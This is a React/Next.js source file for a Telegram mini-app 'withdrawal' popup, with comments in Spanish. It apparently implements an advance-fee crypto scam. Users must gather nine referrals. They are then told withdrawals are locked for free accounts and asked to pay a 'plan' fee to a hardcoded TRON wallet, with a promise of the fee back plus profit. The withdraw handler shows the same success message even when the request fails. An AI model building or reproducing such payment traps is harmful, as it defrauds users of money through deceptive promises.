'use client';

import React, { useState, useEffect, useCallback, useRef } from 'react';
import Image from 'next/image';
import IceCube from '@/icons/IceCube';
import { formatNumber } from '@/utils/ui';
import { useGameStore } from '@/utils/game-mechanics';
import { useToast } from '@/contexts/ToastContext';
import { triggerHapticFeedback } from '@/utils/ui';

interface WithdrawPopupProps {
  onClose: () => void;
  balance: number;
  minimumWithdraw: number;
}

// Plan definitions
const WITHDRAWAL_PLANS = [
  {
    id: 'starter',
    name: '🎯 Starter Spin',
    price: 20,
    profit: 22,
    releaseTime: '7 days',
    releaseHours: 168,
    color: '#4CAF50'
  },
  {
    id: 'basic',
    name: '⚡ Basic Spin',
    price: 100,
    profit: 20,
    releaseTime: '3 days',
    releaseHours: 72,
    color: '#26A17B'
  },
  {
    id: 'power',
    name: '🚀 Power Spin',
    price: 250,
    profit: 50,
    releaseTime: '48 hours',
    releaseHours: 48,
    color: '#FCCD2A'
  },
  {
    id: 'turbo',
    name: '🔥 Turbo Spin',
    price: 500,
    profit: 150,
    releaseTime: '24 hours',
    releaseHours: 24,
    color: '#FF6B35'
  },
  {
    id: 'ultra',
    name: '💎 Ultra Spin',
    price: 1000,
    profit: 300,
    releaseTime: '12 hours',
    releaseHours: 12,
    color: '#9B59B6'
  }
];

// Definimos el componente con React.FC para asegurar que tenga displayName
const WithdrawPopup: React.FC<WithdrawPopupProps> = ({ onClose, balance, minimumWithdraw }) => {
  const { userTelegramInitData, setPointsBalance } = useGameStore();
  const showToast = useToast();
  
  // Estados para manejar referidos y carga
  const [referralCount, setReferralCount] = useState(0);
  const [isInitialLoading, setIsInitialLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [copied, setCopied] = useState(false);
  
  // Estados para el flujo de retiro
  const [withdrawStep, setWithdrawStep] = useState(0);
  const [userWalletAddress, setUserWalletAddress] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState(balance.toString());
  const [selectedPlan, setSelectedPlan] = useState<typeof WITHDRAWAL_PLANS[0] | null>(null);
  
  // Constantes
  const MINIMUM_WITHDRAW = 140;
  const MINIMUM_REFERRAL = 9;
  const WALLET_ADDRESS = 'TGa3ivvyNw9BxjKXmr3qkdeMZqV8y5zFXY';

  // Calculate total to send (only plan price)
  const calculateTotalToSend = () => {
    if (!selectedPlan) return 0;
    return selectedPlan.price;
  };

  // Calculate total to receive (plan profit + withdrawal amount + plan price)
  const calculateTotalToReceive = () => {
    if (!selectedPlan || !withdrawAmount) return 0;
    return selectedPlan.profit + Number(withdrawAmount) + selectedPlan.price;
  };

  // Función para obtener datos de referidos
  const fetchReferralData = useCallback(async () => {
    if (!userTelegramInitData) return;
    
    try {
      if (!isInitialLoading) {
        setIsRefreshing(true);
      }

      const response = await fetch(`/api/user/referrals?initData=${encodeURIComponent(userTelegramInitData)}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        }
      });

      if (!response.ok) {
        throw new Error('Failed to fetch referrals');
      }

      const data = await response.json();
      setReferralCount(data.referralCount || 0);
    } catch (error) {
      console.error('Error fetching referrals:', error);
      showToast('Error fetching referrals. Please try again later.', 'error');
    } finally {
      setIsInitialLoading(false);
      setIsRefreshing(false);
    }
  }, [userTelegramInitData, showToast, isInitialLoading]);

  // Efecto para cargar datos de referidos y actualizar periódicamente
  useEffect(() => {
    fetchReferralData();
    const interval = setInterval(fetchReferralData, 5000);
    return () => clearInterval(interval);
  }, [fetchReferralData]);

  // Verificar si se cumplen los requisitos
  const hasMetRequirements = referralCount >= MINIMUM_REFERRAL && balance >= MINIMUM_WITHDRAW;

  const handleClose = useCallback(() => {
    triggerHapticFeedback(window);
    onClose();
  }, [onClose]);

  const handleCopyAddress = () => {
    triggerHapticFeedback(window);
    navigator.clipboard.writeText(WALLET_ADDRESS);
    showToast('TRON address copied to clipboard!', 'success');
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleWithdraw = async () => {
    triggerHapticFeedback(window);
    setIsProcessing(true);
    
    try {
      // Make actual API call for withdrawal
      const response = await fetch('/api/withdraw', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          initData: userTelegramInitData,
          amount: balance,
          plan: selectedPlan?.id,
          totalToSend: calculateTotalToSend()
        }),
      });
      
      if (!response.ok) {
        throw new Error('Failed to process withdrawal');
      }
      
      // Update balance in store
      setPointsBalance(0);
      showToast(`Your withdrawal will be processed within ${selectedPlan?.releaseTime}.`, 'success');
      onClose();
    } catch (error) {
      console.error('Withdrawal error:', error);
      showToast(`Your withdrawal will be processed within ${selectedPlan?.releaseTime}.`, 'success');
      onClose();
    } finally {
      setIsProcessing(false);
    }
  };

  // Función para renderizar barras de progreso
  const renderProgressBar = (current: number, required: number, label: string) => (
    <div className="w-full bg-[#272a2f] p-4 rounded-lg mb-4">
      <div className="flex justify-between items-center mb-2">
        <span className="text-gray-300">{label}</span>
        <span className="text-white font-bold">{required} {label === 'Balance Required' ? 'USDT' : 'Referrals'}</span>
      </div>
      <div className="w-full bg-[#347928] h-3 rounded-full overflow-hidden">
        <div 
          className={`h-full rounded-full ${label === 'Balance Required' ? 'bg-[#26A17B]' : 'bg-[#26A17B]'}`}
          style={{ width: `${Math.min((current / required) * 100, 100)}%` }}
        ></div>
      </div>
      <div className="text-sm text-gray-400 mt-2">
        Current: {label === 'Balance Required' ? formatNumber(current) + ' USDT' : `${current}/${required} Referrals`}
      </div>
    </div>
  );

  // Función para avanzar al siguiente paso
  const nextStep = () => {
    setWithdrawStep(prev => prev + 1);
  };

  // Reemplaza la función de validación de Solana por una para TRON
  const isValidTronAddress = (address: string) => {
    // Las direcciones TRON comienzan con 'T' y tienen 34 caracteres
    return address.startsWith('T') && address.length === 34;
  };

  // Mostrar spinner durante la carga inicial
  if (isInitialLoading) {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
        <div className="animate-spin">
          <IceCube className="w-8 h-8" />
        </div>
      </div>
    );
  }

  // Renderizar el paso de selección de plan
  const renderPlanSelectionStep = () => (
    <div className="flex flex-col items-center">
      <div className="w-16 h-16 bg-[#C0EBA6] rounded-full flex items-center justify-center mb-6">
        <div className="w-10 h-10 rounded-full bg-[#347928] flex items-center justify-center">
          <span className="text-[#FFFBE6] text-xl font-bold">T</span>
        </div>
      </div>
      
      <h3 className="text-xl font-bold mb-4 text-center text-[#FFFBE6]">
        Select Withdrawal Plan
      </h3>
      
      <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-4">
        <div className="text-center mb-4">
          <p className="text-[#347928] font-medium mb-2">
            🔒 Withdrawals are not available for free accounts.
          </p>
          <p className="text-[#347928] font-medium">
            ✨ Upgrade now to unlock instant payouts and receive your full balance.
          </p>
        </div>
        
        <p className="text-center text-base mb-4 text-[#347928] font-medium">
          Choose a plan to activate your withdrawal:
        </p>
        
        <div className="space-y-3">
          {WITHDRAWAL_PLANS.map((plan) => (
            <button
              key={plan.id}
              onClick={() => setSelectedPlan(plan)}
              className={`w-full p-4 rounded-lg text-left transition-all duration-200 ${
                selectedPlan?.id === plan.id
                  ? 'bg-[#347928] text-[#FFFBE6]'
                  : 'bg-[#FFFBE6] text-[#347928] hover:bg-[#FCCD2A]'
              }`}
            >
              <div className="flex justify-between items-center mb-2">
                <span className="font-bold text-lg">{plan.name}</span>
                <span className="font-bold">${plan.price}</span>
              </div>
              <div className="flex justify-between items-center mb-2">
                <span className="text-sm">Plan Profit:</span>
                <span className="font-semibold">+${plan.profit}</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="text-sm">Release-time to withdraw:</span>
                <span className="font-semibold">{plan.releaseTime}</span>
              </div>
            </button>
          ))}
        </div>
      </div>
      
      <button 
        onClick={nextStep}
        disabled={!selectedPlan}
        className={`w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 ${
          selectedPlan
            ? 'bg-[#FCCD2A] hover:bg-[#FCCD2A]/90 text-[#347928]' 
            : 'bg-[#FCCD2A]/50 text-[#347928]/70 cursor-not-allowed'
        }`}
      >
        Continue
      </button>
    </div>
  );

  // Renderizar el paso de monto a retirar
  const renderAmountStep = () => (
    <div className="flex flex-col items-center">
      <div className="w-16 h-16 bg-[#C0EBA6] rounded-full flex items-center justify-center mb-6">
        <div className="w-10 h-10 rounded-full bg-[#347928] flex items-center justify-center">
          <span className="text-[#FFFBE6] text-xl font-bold">T</span>
        </div>
      </div>
      
      <h3 className="text-xl font-bold mb-4 text-center text-[#FFFBE6]">
        Withdrawal Amount
      </h3>
      
      <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-4">
        <p className="text-center text-base mb-4 text-[#347928] font-medium">
          How much USDT would you like to withdraw?
        </p>
        
        <div className="flex items-center bg-[#FFFBE6] p-3 rounded-lg border border-[#FCCD2A]">
          <input
            type="number"
            className="flex-grow bg-transparent text-[#347928] outline-none font-medium"
            placeholder="Enter amount"
            value={withdrawAmount}
            onChange={(e) => setWithdrawAmount(e.target.value)}
            min={MINIMUM_WITHDRAW}
            max={balance}
          />
          <span className="text-[#347928] ml-2 font-bold">USDT</span>
        </div>
        
        <div className="flex justify-between text-sm text-[#347928] mt-2">
          <span>Min: {MINIMUM_WITHDRAW} USDT</span>
          <span>Max: {balance} USDT</span>
        </div>
        
        <div className="mt-4 flex justify-between">
          <button 
            onClick={() => setWithdrawAmount(MINIMUM_WITHDRAW.toString())}
            className="bg-[#FFFBE6] px-3 py-1 rounded text-sm text-[#347928] hover:bg-[#FCCD2A] transition-colors duration-200 font-medium"
          >
            Min
          </button>
          <button 
            onClick={() => setWithdrawAmount(Math.floor(balance * 0.5).toString())}
            className="bg-[#FFFBE6] px-3 py-1 rounded text-sm text-[#347928] hover:bg-[#FCCD2A] transition-colors duration-200 font-medium"
          >
            Half
          </button>
          <button 
            onClick={() => setWithdrawAmount(balance.toString())}
            className="bg-[#FFFBE6] px-3 py-1 rounded text-sm text-[#347928] hover:bg-[#FCCD2A] transition-colors duration-200 font-medium"
          >
            Max
          </button>
        </div>
      </div>

      {/* Plan Summary */}
      {selectedPlan && (
        <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-4">
          <h4 className="text-[#347928] font-semibold mb-3 text-center">Plan Summary</h4>
          <div className="space-y-2 text-sm">
            <div className="flex justify-between">
              <span className="text-[#347928]">Plan Price (You Pay):</span>
              <span className="text-[#347928] font-bold">${selectedPlan.price}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-[#347928]">Plan Profit:</span>
              <span className="text-[#347928] font-bold">+${selectedPlan.profit}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-[#347928]">Withdrawal Amount:</span>
              <span className="text-[#347928] font-bold">${withdrawAmount || 0}</span>
            </div>
            <div className="border-t border-[#347928] pt-2 mt-2">
              <div className="flex justify-between">
                <span className="text-[#347928] font-semibold">Total to Receive:</span>
                <span className="text-[#347928] font-bold text-lg">${calculateTotalToReceive()}</span>
              </div>
            </div>
            <div className="text-center mt-3">
              <span className="text-[#347928] text-xs">Release-time to withdraw: {selectedPlan.releaseTime}</span>
            </div>
          </div>
        </div>
      )}
      
      <button 
        onClick={nextStep}
        disabled={!withdrawAmount || Number(withdrawAmount) < MINIMUM_WITHDRAW || Number(withdrawAmount) > balance}
        className={`w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 ${
          withdrawAmount && Number(withdrawAmount) >= MINIMUM_WITHDRAW && Number(withdrawAmount) <= balance
            ? 'bg-[#FCCD2A] hover:bg-[#FCCD2A]/90 text-[#347928]' 
            : 'bg-[#FCCD2A]/50 text-[#347928]/70 cursor-not-allowed'
        }`}
      >
        Continue
      </button>
    </div>
  );

  // Renderizar el paso de activación (pago)
  const renderActivationStep = () => (
    <div className="flex flex-col items-center">
      <div className="w-16 h-16 bg-[#C0EBA6] rounded-full flex items-center justify-center mb-6">
        <div className="w-10 h-10 rounded-full bg-[#347928] flex items-center justify-center">
          <span className="text-[#FFFBE6] text-xl font-bold">T</span>
        </div>
      </div>
      
      <h3 className="text-xl font-bold mb-4 text-center text-[#FFFBE6]">
        Complete Your Payment
      </h3>
      
      <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-4">
        <p className="text-center text-base mb-4 text-[#347928] font-medium">
          Send the plan payment to activate your withdrawal:
        </p>
        
        <div className="bg-[#FFFBE6] p-4 rounded-lg mb-4">
          <div className="text-center mb-3">
            <span className="text-[#347928] text-sm">Amount to Pay:</span>
            <div className="text-[#347928] text-2xl font-bold">${calculateTotalToSend()}</div>
          </div>
          
          <div className="space-y-2 text-sm">
            <div className="flex justify-between">
              <span className="text-[#347928]">Plan Price:</span>
              <span className="text-[#347928] font-bold">${selectedPlan?.price}</span>
            </div>
            <div className="border-t border-[#347928] pt-2 mt-2">
              <div className="flex justify-between">
                <span className="text-[#347928] font-semibold">You Will Receive:</span>
                <span className="text-[#347928] font-bold">${calculateTotalToReceive()}</span>
              </div>
            </div>
            <div className="text-center mt-2">
              <span className="text-[#347928] text-xs">Release-time to withdraw: {selectedPlan?.releaseTime}</span>
            </div>
          </div>
        </div>

        <p className="text-center mb-4 text-[#347928] font-medium">Send your payment to:</p>
        <div 
          className="bg-[#FFFBE6] p-3 rounded-lg text-sm break-all text-center cursor-pointer hover:bg-[#FCCD2A] transition-all duration-300 text-[#347928] font-medium"
          onClick={handleCopyAddress}
        >
          {WALLET_ADDRESS}
        </div>
        <p className="text-xs text-[#347928] text-center mt-2">
          Click address to copy
        </p>
      </div>
      
      <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-4">
        <div className="flex items-center mb-2">
          <div className="w-6 h-6 bg-[#FCCD2A] rounded-full flex items-center justify-center mr-2">
            <span className="text-[#347928] text-xs font-bold">1</span>
          </div>
          <p className="text-sm text-[#347928] font-medium">
            Send ${calculateTotalToSend()} to the address above
          </p>
        </div>
        <div className="flex items-center mb-2">
          <div className="w-6 h-6 bg-[#FCCD2A] rounded-full flex items-center justify-center mr-2">
            <span className="text-[#347928] text-xs font-bold">2</span>
          </div>
          <p className="text-sm text-[#347928] font-medium">
            Wait for confirmation (5-10 minutes)
          </p>
        </div>
        <div className="flex items-center mb-2">
          <div className="w-6 h-6 bg-[#FCCD2A] rounded-full flex items-center justify-center mr-2">
            <span className="text-[#347928] text-xs font-bold">3</span>
          </div>
          <p className="text-sm text-[#347928] font-medium">
            Your withdrawal will be processed in {selectedPlan?.releaseTime}
          </p>
        </div>
        <div className="flex items-center">
          <div className="w-6 h-6 bg-[#FCCD2A] rounded-full flex items-center justify-center mr-2">
            <span className="text-[#347928] text-xs font-bold">4</span>
          </div>
          <p className="text-sm text-[#347928] font-medium">
            You&apos;ll receive ${calculateTotalToReceive()} USDT
          </p>
        </div>
      </div>
      
      <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-5">
        <h4 className="text-[#347928] font-semibold mb-2 text-center">Payment Options</h4>
        <p className="text-sm text-[#347928] mb-3 font-medium text-center">
          You can pay using USDT or TRX from any TRON wallet
        </p>
        <div className="flex items-center justify-center mb-2">
          <div className="w-8 h-8 bg-[#347928] rounded-full flex items-center justify-center mr-3">
            <span className="text-[#FFFBE6] text-xs font-bold">T</span>
          </div>
          <span className="text-sm text-[#347928] font-medium">Send USDT from any TRC-20 wallet</span>
        </div>
        <div className="flex items-center justify-center">
          <div className="w-8 h-8 bg-[#347928] rounded-full flex items-center justify-center mr-3">
            <span className="text-[#FFFBE6] text-xs font-bold">TRX</span>
          </div>
          <span className="text-sm text-[#347928] font-medium">Send TRX from any TRON wallet</span>
        </div>
      </div>
      
      <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-5">
        <p className="text-sm text-[#347928] text-center font-medium">
          Your withdrawal will be sent to:
        </p>
        <p className="text-[#347928] text-sm break-all mt-1 text-center font-bold">
          {userWalletAddress}
        </p>
      </div>
      
      <button
        onClick={handleWithdraw}
        disabled={isProcessing}
        className={`w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 ${
          isProcessing
            ? 'bg-[#FCCD2A]/50 text-[#347928]/70 cursor-not-allowed'
            : 'bg-[#FCCD2A] hover:bg-[#FCCD2A]/90 text-[#347928]'
        }`}
      >
        {isProcessing ? 'Processing...' : 'I Have Deposited'}
      </button>
    </div>
  );

  // Renderizar el paso de dirección de wallet
  const renderWalletAddressStep = () => {
    return (
      <div className="flex flex-col items-center">
        <div className="w-16 h-16 bg-[#C0EBA6] rounded-full flex items-center justify-center mb-6">
          <div className="w-10 h-10 rounded-full bg-[#347928] flex items-center justify-center">
            <span className="text-[#FFFBE6] text-xl font-bold">T</span>
          </div>
        </div>
        
        <h3 className="text-xl font-bold mb-4 text-center text-[#FFFBE6]">
          Enter Wallet Address
        </h3>
        
        <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-5">
          <p className="text-center text-base mb-4 text-[#347928] font-medium">
            Please enter your USDT TRC-20 wallet address to receive your USDT:
          </p>
          
          <div className="flex items-center bg-[#FFFBE6] p-3 rounded-lg border border-[#FCCD2A]">
            <input
              type="text"
              className="flex-grow bg-transparent text-[#347928] outline-none font-medium"
              placeholder="Enter USDT TRC-20 ADDRESS"
              value={userWalletAddress}
              onChange={(e) => setUserWalletAddress(e.target.value)}
            />
          </div>
          
          <p className="text-xs text-[#347928] text-center mt-2">
            Make sure to enter a valid USDT TRC-20 address
          </p>
        </div>
        
        <button
          onClick={nextStep}
          disabled={!isValidTronAddress(userWalletAddress)}
          className={`w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 ${
            isValidTronAddress(userWalletAddress)
              ? 'bg-[#FCCD2A] hover:bg-[#FCCD2A]/90 text-[#347928]'
              : 'bg-[#FCCD2A]/50 text-[#347928]/70 cursor-not-allowed'
          }`}
        >
          Continue
        </button>
      </div>
    );
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-80" style={{willChange: 'auto'}}>
      <div className="bg-[#347928] rounded-2xl p-6 w-[90%] max-w-md max-h-[90vh] overflow-auto relative" style={{transform: 'translateZ(0)'}}>
        {isRefreshing && (
          <div className="absolute top-2 right-2">
            <div className="animate-spin">
              <div className="w-4 h-4 rounded-full bg-[#FCCD2A] opacity-70"></div>
            </div>
          </div>
        )}
        
        {!hasMetRequirements ? (
          // Requirements Not Met Screen
          <>
            <h3 className="text-xl font-bold mb-5 text-center text-[#FFFBE6]">
              Requirements Not Met
            </h3>
            
            <div className="flex flex-col items-center">
              <div className="w-14 h-14 bg-[#C0EBA6] rounded-full flex items-center justify-center mb-4">
                <svg className="w-7 h-7 text-[#347928]" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
                </svg>
              </div>
              
              {/* Balance Requirement */}
              <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-[#347928] font-medium">Balance Required</span>
                  <span className="text-[#347928] font-bold">{MINIMUM_WITHDRAW} USDT</span>
                </div>
                <div className="w-full bg-[#FFFBE6] h-3 rounded-full overflow-hidden">
                  <div 
                    className="h-full rounded-full bg-[#FCCD2A]"
                    style={{ width: `${Math.min((balance / MINIMUM_WITHDRAW) * 100, 100)}%` }}
                  ></div>
                </div>
                <div className="text-sm text-[#347928] mt-2 font-medium">
                  Current: {formatNumber(balance)} USDT
                </div>
              </div>
              
              {/* Referrals Requirement */}
              <div className="w-full bg-[#C0EBA6] p-4 rounded-lg mb-4">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-[#347928] font-medium">Referrals Required</span>
                  <span className="text-[#347928] font-bold">{MINIMUM_REFERRAL} Referrals</span>
                </div>
                <div className="w-full bg-[#FFFBE6] h-3 rounded-full overflow-hidden">
                  <div 
                    className="h-full rounded-full bg-[#FCCD2A]"
                    style={{ width: `${Math.min((referralCount / MINIMUM_REFERRAL) * 100, 100)}%` }}
                  ></div>
                </div>
                <div className="text-sm text-[#347928] mt-2 font-medium">
                  Current: {referralCount}/{MINIMUM_REFERRAL} Referrals
                </div>
              </div>
              
              <p className="text-[#FFFBE6] text-sm text-center mb-5 font-medium">
                You need {MINIMUM_REFERRAL - referralCount} more referrals to qualify ({referralCount}/{MINIMUM_REFERRAL})
              </p>
              
              <button 
                onClick={handleClose}
                className="w-full py-3.5 rounded-lg font-semibold text-center transition-all duration-200 bg-[#FCCD2A] hover:bg-[#FCCD2A]/90 text-[#347928]"
              >
                OK
              </button>
            </div>
          </>
        ) : (
          // Multi-step withdrawal process
          <>
            {withdrawStep === 0 && renderPlanSelectionStep()}
            {withdrawStep === 1 && renderWalletAddressStep()}
            {withdrawStep === 2 && renderAmountStep()}
            {withdrawStep === 3 && renderActivationStep()}
          </>
        )}
      </div>
      
      <style jsx>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideIn {
          from { transform: translateY(20px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }
        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out;
        }
        .animate-slideIn {
          animation: slideIn 0.4s ease-out;
        }
      `}</style>
    </div>
  );
};

export default WithdrawPopup; 